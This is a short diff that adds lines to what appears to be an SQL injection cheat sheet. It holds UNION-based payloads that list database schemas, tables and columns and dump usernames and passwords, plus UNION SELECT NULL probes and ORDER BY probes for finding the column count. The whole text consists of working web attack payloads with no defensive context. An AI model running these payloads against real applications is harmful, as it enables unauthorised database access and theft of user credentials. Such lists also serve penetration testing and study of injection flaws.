@@ -120,4 +120,20 @@ union select all 1,table_schema from information_schema.tables
 union select all 1,table_name from information_schema.tables where table_schema='sysadmin' 
 union select all 1,column_name from information_schema.columns where table_name='users' 
 union select 1,(select group_concat(username,password) from sysadmin.users) 
+
+' UNION SELECT username, password FROM users--
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc ...
+------------------------------------------
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc ...
 ```
